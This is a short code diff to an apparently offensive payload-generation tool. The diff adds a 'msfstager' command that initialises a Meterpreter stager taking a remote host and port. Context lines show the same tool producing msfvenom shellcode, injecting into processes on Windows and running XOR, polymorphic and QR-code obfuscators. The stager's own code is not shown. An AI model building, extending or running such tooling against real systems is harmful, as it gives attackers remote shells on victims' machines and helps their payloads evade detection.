@@ -7,6 +7,7 @@ import utils.extract as extract
 import utils.formatout as formatout
 import utils.hashes as hashes
 import utils.header
+import utils.meterpreter as meterpreter
 if os.name == 'nt':
   import utils.injection as injection
 import utils.msf as msf
@@ -46,6 +47,7 @@ def main(command_line=None):
   formatout.format.init()
   if os.name == 'nt':
     injection.inject.init()
+  meterpreter.stager.init()
   msf.msfvenom.init()
   feed.feed_obfuscator.init()
   qrcode.qrcode_obfuscator.init()
@@ -67,6 +69,11 @@ def main(command_line=None):
     print(f"{nstate.OKBLUE} create payload")
     cs = msf.msfvenom(arguments.cmd)
     cs.CreateShellcodeEx(msfvenom_path)
+
+  elif arguments.command == 'msfstager':
+    stager = meterpreter.stager(arguments.remote_host, arguments.port, arguments.timeout, arguments.arch)
+    stager.process()
+
 
   elif arguments.command == 'xorpoly':
     poly = xorpoly.xor(arguments.input, arguments.output, b'', b'', f'{tpl_path}xor-stub.tpl', arguments.key)
